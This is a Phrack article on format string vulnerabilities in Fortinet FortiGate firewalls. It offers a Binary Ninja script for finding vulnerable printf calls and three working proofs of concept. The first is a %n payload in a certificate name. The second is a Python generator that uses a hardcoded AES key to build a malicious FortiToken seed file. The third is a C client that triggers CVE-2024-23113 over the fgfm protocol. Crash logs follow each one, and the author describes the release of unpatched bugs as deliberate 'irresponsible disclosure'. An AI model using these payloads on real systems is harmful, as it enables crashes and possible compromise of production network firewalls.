@@ -1,0 +1,372 @@
+---
+title: Long Live Format Strings
+author: Mark Remarkable
+---
+                             ==Phrack Inc.==
+
+                Volume 0x10, Issue 0x47, Phile #0x10 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=--------------------=[ Long Live Format Strings ]=---------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------------=[ Mark Remarkable ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+
+  0. Introduction
+  1. Finding Format String Bugs
+  2. Beating a Dead Firewall
+
+---[ 0 - Introduction
+
+Format string attacks should be dead. glibc's FORTIFY_SOURCE was released
+nearly 20 years ago. It's enabled by default. Vulnerabilities are trivial 
+to detect with static source code analysis. You have to be actively trying 
+to make a vulnerable piece of software. And yet, despite the existence of 
+foolproof protections, we still see multi-billion dollar companies ship 
+code with obvious format string vulnerabilities.
+
+This article will consist of a few lines of code and a few boring 0-day's,
+just to keep the reader interested.
+
+---[ 1 - Finding Format String Bugs 
+
+Most format strings are hardcoded, or at least come from a small set of 
+possible values. The exceptions to this pattern are what introduce format
+string bugs. Modern reverse engineering tools make it incredibly easy to 
+filter format string function calls down to the 1% of exceptions. Although 
+there are better scripts out there, this simple Binary Ninja script was 
+good enough to find a few quick 0days
+
+  fns={
+    "printf":0,
+    "fprintf":1,
+    "dprintf":1,
+    "sprintf":1,
+    "snprintf":2,
+    "vprintf":0,
+    "vfprintf":1,
+    "vsprintf":1,
+    "vsnprintf":2,
+  }
+ 
+  def check(function,arg):
+      for caller in function.caller_sites:
+          try: inst=caller.mlil.ssa_form
+          except KeyboardInterrupt as e: return
+          except Exception: continue
+          if inst is None: continue
+          op=inst.operation
+          if op in (MediumLevelILOperation.MLIL_CALL_SSA,
+              MediumLevelILOperation.MLIL_CALL_UNTYPED_SSA,
+              MediumLevelILOperation.MLIL_TAILCALL_SSA):
+              if len(inst.params)<arg+1: continue
+              if inst.dest.constant!=function.lowest_address: continue
+          else: continue
+          param=inst.params[arg]
+          possible=param.possible_values
+          if possible.type in (RegisterValueType.StackFrameOffset,
+              RegisterValueType.UndeterminedValue):
+              yield inst.address
+ 
+  for f in functions:
+      print("-----"+f+"-----)
+      for ff in bv.get_functions_by_name(f):
+          for i in check(ff, fns[f]):
+              print(hex(i))
+
+Put simply, this script checks for every call to a printf-family function,
+then checks if the format argument is a constant value, or a stack buffer. 
+There are, of course, plenty of better tools to perform this kind of basic 
+static analysis, but I want to make the point that you don't have to be a 
+skilled exploit dev to find format string bugs in a poorly made piece of 
+software.
+
+---[ 2 - Beating a Dead Firewall
+
+Running that script against something very secure like the Fortinet 
+/bin/init binary, you could easily rack up enough CVEs to pad your resume.
+Luckily for you, and in the spirit of irresponsible disclosure, I am 
+publishing a few crashes just for Phrack! Please enjoy two 0day 
+unauthenticated bugs, and one unauthenticated n-day:
+
+---- [ 2.1 - Certificate Import
+
+I heard somewhere that PKI is important. I wonder what happens if I add 
+some %n's to the certificate name on import...
+
+  1. System -> Certificates -> Create/Import -> Certificate
+     -> Import Certificate -> Certificate
+  2. Add a valid certificate file and key file
+  3. Set the certificate name to %4919$1$c%n%n%n%n%n%n%n%n%n
+  4. Click create
+
+Internal server error? Let's check the crash log.
+
+  # diagnose debug crashlog read
+
+  <02946> firmware FortiGate-VM64 v7.2.7,build1577b1577,240131 (GA.M) (Release)
+  <02946> application httpsd
+  <02946> *** signal 11 (Segmentation fault) received ***
+  <02946> Register dump:
+  <02946> RAX: 0000000010c9dde0   RBX: 0000000010caf09c
+  <02946> RCX: 00007fffd366e008   RDX: 00007f132d45bfc0
+  <02946> R08: 0000000010c97050   R09: 00007f132d49abe0
+  <02946> R10: 0000000000004000   R11: 0000000000000000
+  <02946> R12: 00007fffd3668570   R13: 0000000000001337
+  <02946> R14: 0000000000000009   R15: 00000000000006d9
+  <02946> RSI: 00007fffd366a288   RDI: 00007fffd366e000
+  <02946> RBP: 00007fffd3668dd0   RSP: 00007fffd3668480
+  <02946> RIP: 00007f132d346c6c   EFLAGS: 0000000000010212
+  <02946> CS:  0033   FS: 0000   GS: 0000
+  <02946> Trap: 000000000000000e   Error: 0000000000000004
+  <02946> OldMask: 0000000000000000
+  <02946> CR2: 00007fffd366e000
+  <02946> stack: 0x7fffd3668480 - 0x7fffd366d490 
+  <02946> Backtrace:
+  <02946> [0x7f132d346c6c] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  00064c6c
+  <02946> [0x7f132d34905d] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  0006705d
+  <02946> [0x7f132d35c826] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  0007a826
+  <02946> [0x7f132d335d42] => /usr/lib/x86_64-linux-gnu/libc.so.6 
+  (__snprintf+0x00000092) liboffset 00053d42
+  <02946> [0x0222351b] => /bin/httpsd  
+  <02946> [0x02223a65] => /bin/httpsd  
+  <02946> [0x00ddb567] => /bin/httpsd  
+  <02946> [0x00d08dc4] => /bin/httpsd  
+  <02946> [0x00d09419] => /bin/httpsd  
+  <02946> [0x00d0b547] => /bin/httpsd  
+  <02946> [0x00d0d01d] => /bin/httpsd  
+  <02946> [0x00caeef9] => /bin/httpsd  
+  <02946> [0x00e9984a] => /bin/httpsd (ap_run_handler+0x0000004a) 
+  <02946> [0x00e9a0a6] => /bin/httpsd (ap_invoke_handler+0x000000c6) 
+  <02946> [0x00ee1ec9] => /bin/httpsd  
+  <02946> [0x00ee2111] => /bin/httpsd (ap_process_request+0x00000021) 
+  <02946> [0x00eda23f] => /bin/httpsd  
+  <02946> [0x00e9e0aa] => /bin/httpsd (ap_run_process_connection+0x0000004a) 
+  <02946> [0x00eb3cb7] => /bin/httpsd  
+  <02946> [0x00eb3f86] => /bin/httpsd  
+  <02946> [0x00eb4174] => /bin/httpsd  
+  <02946> [0x00eb47ad] => /bin/httpsd  
+  <02946> [0x00eafa51] => /bin/httpsd (ap_run_mpm+0x00000061) 
+  <02946> [0x00eaf586] => /bin/httpsd  
+  <02946> [0x00449f6f] => /bin/httpsd  
+  <02946> [0x0044f498] => /bin/httpsd  
+  <02946> [0x0044fc8a] => /bin/httpsd  
+  <02946> [0x004524af] => /bin/httpsd  
+  <02946> [0x00452dd9] => /bin/httpsd  
+  <02946> [0x7f132d305deb] => /usr/lib/x86_64-linux-gnu/libc.so.6 
+  (__libc_start_main+0x000000eb) liboffset 00023deb
+  <02946> [0x004450da] => /bin/httpsd  
+
+R13 contains 0x1337, which just so happens to be the exact number of bytes
+we just printed with %4919$1$c. Looks like a vuln to me!
+
+---- [ 2.2 - FortiToken import
+
+MFA solves all security problems, and Fortinet makes MFA easy with 
+FortiTokens. Let's generate some FortiToken seed files:
+
+  ----- ftk.py -----
+  import base64
+  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+  from cryptography.hazmat.backends import default_backend
+  # lol hardcoded key
+  FTK_KEY="3F2FE4F6E40B53CFF0B5948993F4D4AB369C7F0375FDC92D64CB3E8880FFAE4E"
+  FTK_KEY=bytes.fromhex(FTK_KEY)
+  format_str=b'%4919$1$c%n%n%n '
+  iv=b'\0'*16
+  a=Cipher(algorithms.AES(FTK_KEY), modes.CBC(iv), backend=default_backend())
+  e=a.encryptor()
+  ct=e.update(format_str)
+  ciphertext=base64.b64encode(ct).decode()
+  print(f"FTK00000000000EA,{ciphertext},{iv.hex()}")
+  ------ ftk.py -----
+
+  $ python3 ftk.py > poc.ftk
+ 
+Importing a seed file is easy:
+
+  1. User & Authentication -> FortiTokens -> Create New -> Import -> Seed File
+  2. Upload poc.ftk
+ 
+Hmm... what's this? Another error? Let's see what the crashlog has to say:
+
+  <02664> firmware FortiGate-VM64 v7.2.7,build1577b1577,240131 (GA.M) (Release)
+  <02664> application httpsd
+  <02664> *** signal 11 (Segmentation fault) received ***
+  <02664> Register dump:
+  <02664> RAX: 0000000010da2830   RBX: 0000000010db020c
+  <02664> RCX: 00007ffd536af008   RDX: 00007fd3f60e3fc0
+  <02664> R08: 0000000010d981c0   R09: 00007fd3f6122be0
+  <02664> R10: 0000000000000010   R11: 0000000000000000
+  <02664> R12: 00007ffd536a7900   R13: 0000000000001337
+  <02664> R14: 0000000000000004   R15: 0000000000000a67
+  <02664> RSI: 00007ffd536a9618   RDI: 00007ffd536af000
+  <02664> RBP: 00007ffd536a8160   RSP: 00007ffd536a7810
+  <02664> RIP: 00007fd3f5fcec6c   EFLAGS: 0000000000010212
+  <02664> CS:  0033   FS: 0000   GS: 0000
+  <02664> Trap: 000000000000000e   Error: 0000000000000004
+  <02664> OldMask: 0000000000000000
+  <02664> CR2: 00007ffd536af000
+  <02664> stack: 0x7ffd536a7810 - 0x7ffd536acfc0 
+  <02664> Backtrace:
+  <02664> [0x7fd3f5fcec6c] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  00064c6c
+  <02664> [0x7fd3f5fd105d] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  0006705d
+  <02664> [0x7fd3f5fe4826] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  0007a826
+  <02664> [0x7fd3f5fbdd42] => /usr/lib/x86_64-linux-gnu/libc.so.6 
+  (__snprintf+0x00000092) liboffset 00053d42
+  <02664> [0x0290048a] => /bin/httpsd  
+  <02664> [0x00de6fbd] => /bin/httpsd  
+  <02664> [0x00d08dc4] => /bin/httpsd  
+  <02664> [0x00d09419] => /bin/httpsd  
+  <02664> [0x00d0b547] => /bin/httpsd  
+  <02664> [0x00d0d01d] => /bin/httpsd  
+  <02664> [0x00caeef9] => /bin/httpsd  
+  <02664> [0x00e9984a] => /bin/httpsd (ap_run_handler+0x0000004a) 
+  <02664> [0x00e9a0a6] => /bin/httpsd (ap_invoke_handler+0x000000c6) 
+  <02664> [0x00ee1ec9] => /bin/httpsd  
+  <02664> [0x00ee2111] => /bin/httpsd (ap_process_request+0x00000021) 
+  <02664> [0x00eda23f] => /bin/httpsd  
+  <02664> [0x00e9e0aa] => /bin/httpsd (ap_run_process_connection+0x0000004a) 
+  <02664> [0x00eb3cb7] => /bin/httpsd  
+  <02664> [0x00eb3f86] => /bin/httpsd  
+  <02664> [0x00eb3fcb] => /bin/httpsd  
+  <02664> [0x00eb48e5] => /bin/httpsd  
+  <02664> [0x00eafa51] => /bin/httpsd (ap_run_mpm+0x00000061) 
+  <02664> [0x00eaf586] => /bin/httpsd  
+  <02664> [0x00449f6f] => /bin/httpsd  
+  <02664> [0x0044f498] => /bin/httpsd  
+  <02664> [0x0044fc8a] => /bin/httpsd  
+  <02664> [0x004524af] => /bin/httpsd  
+  <02664> [0x00452dd9] => /bin/httpsd  
+  <02664> [0x7fd3f5f8ddeb] => /usr/lib/x86_64-linux-gnu/libc.so.6 
+  (__libc_start_main+0x000000eb) liboffset 00023deb
+  <02664> [0x004450da] => /bin/httpsd  
+
+Unsurprisingly, this crash looks almost identical to the last one. The only
+difference is the stack trace, which shows
+
+  (__snprintf+0x00000092) liboffset 00053d42
+  [0x0290048a] => /bin/httpsd
+  [0x00de6fbd] => /bin/httpsd
+  [0x00d08dc4] => /bin/httpsd
+
+rather than 
+
+  (__snprintf+0x00000092) liboffset 00053d42
+  [0x0222351b] => /bin/httpsd
+  [0x02223a65] => /bin/httpsd
+  [0x00ddb567] => /bin/httpsd
+
+---- [ 2.3 - CVE-2024-23113
+
+Does CVE-2024-23113 sound too complicated? In reality, it's as shrimple as
+
+  #include <string.h>
+  #include <unistd.h>
+  #include <sys/socket.h>
+  #include <arpa/inet.h>
+  #include <openssl/ssl.h>
+  #include <openssl/err.h>
+  
+  char *payload=\
+  "reply 200\r\n"\
+  "request=auth\r\n"\
+  "mgmtip=%270441$1$c%n%n%n%n%n%n%n%n%n%n\r\n"\
+  "\r\n";
+  
+  #define HOST "69.69.69.69"
+  #define PORT 541
+  #define KEYFILE "key.pem"
+  #define CERTFILE "cert.pem"
+  
+  void main(){
+    int sock;
+    struct sockaddr_in sa={0};
+    SSL_CTX *ctx;
+    SSL *ssl;
+    const SSL_METHOD *method;
+    uint32_t len_be;
+    char *fgfm_magic="\x36\xe0\x11\x00";
+    
+    method=TLS_server_method();
+    ctx=SSL_CTX_new(method);
+    SSL_CTX_use_certificate_file(ctx, CERTFILE, SSL_FILETYPE_PEM);
+    SSL_CTX_use_PrivateKey_file(ctx, KEYFILE, SSL_FILETYPE_PEM);
+    sock=socket(AF_INET, SOCK_STREAM, 0);
+    sa.sin_family=AF_INET;
+    sa.sin_port=htons(PORT);
+    sa.sin_addr.s_addr=inet_addr(HOST);
+    connect(sock, &sa, sizeof(struct sockaddr));
+    ssl=SSL_new(ctx);
+    SSL_set_fd(ssl, sock);
+    
+    if(SSL_accept(ssl)<=0)
+      ERR_print_errors_fp(stderr);
+    else{
+      len_be=htonl(strlen(payload)+1+8);
+      SSL_write(ssl, fgfm_magic, 4);
+      SSL_write(ssl, &len_be, 4);
+      SSL_write(ssl, payload, strlen(payload)+1);
+    }
+    SSL_shutdown(ssl);
+    SSL_free(ssl);
+    close(sock);
+    SSL_CTX_free(ctx);
+  }
+
+Just change the HOST and provide a key.pem/cert.pem. The hardest part about
+developing a crash POC was realizing the TCP client is acting as the TLS 
+server. The protocol itself is just a magic number, size field, and 
+text-based body.
+
+  <23066> firmware FortiGate-VM64 v7.2.4,build1396b1396,230131 (GA.F) 
+  (Release)
+  <23066> application fgfmsd
+  <23066> *** signal 11 (Segmentation fault) received ***
+  <23066> Register dump:
+  <23066> RAX: 00007f652c3d2040   RBX: 00007f652c8f7844
+  <23066> RCX: 00007ffd3fe86008   RDX: 00007f6531e7afc0
+  <23066> R08: 00007f652c3cf010   R09: 0000000000000000
+  <23066> R10: 0000000000000022   R11: 0000000000000246
+  <23066> R12: 00007ffd3fe83780   R13: 0000000000042069
+  <23066> R14: 000000000000000b   R15: 0000000000000303
+  <23066> RSI: 00007ffd3fe84138   RDI: 00007ffd3fe86000
+  <23066> RBP: 00007ffd3fe83fe0   RSP: 00007ffd3fe83690
+  <23066> RIP: 00007f6531d65c6c   EFLAGS: 0000000000010212
+  <23066> CS:  0033   FS: 0000   GS: 0000
+  <23066> Trap: 000000000000000e   Error: 0000000000000004
+  <23066> OldMask: 0000000000000000
+  <23066> CR2: 00007ffd3fe86000
+  <23066> stack: 0x7ffd3fe83690 - 0x7ffd3fe854d0 
+  <23066> Backtrace:
+  <23066> [0x7f6531d65c6c] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  00064c6c
+  <23066> [0x7f6531d6805d] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  0006705d
+  <23066> [0x7f6531d7b826] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
+  0007a826
+  <23066> [0x7f6531d54d42] => /usr/lib/x86_64-linux-gnu/libc.so.6 
+  (__snprintf+0x00000092) liboffset 00053d42
+  <23066> [0x00acc6aa] => /bin/fgfmd  
+  <23066> [0x00acd30c] => /bin/fgfmd  
+  <23066> [0x00acdcef] => /bin/fgfmd  
+  <23066> [0x00aee12a] => /bin/fgfmd  
+  <23066> [0x00ae8674] => /bin/fgfmd  
+  <23066> [0x00ad60ba] => /bin/fgfmd  
+  <23066> [0x00ae1d11] => /bin/fgfmd  
+  <23066> [0x00449eaf] => /bin/fgfmd  
+  <23066> [0x004531da] => /bin/fgfmd  
+  <23066> [0x0044fd9c] => /bin/fgfmd  
+  <23066> [0x00452428] => /bin/fgfmd  
+  <23066> [0x00452d71] => /bin/fgfmd  
+  <23066> [0x7f6531d24deb] => /usr/lib/x86_64-linux-gnu/libc.so.6 
+  (__libc_start_main+0x000000eb) liboffset 00023deb
+  <23066> [0x00444f1a] => /bin/fgfmd  
+
+|=[ EOF ]=---------------------------------------------------------------=|
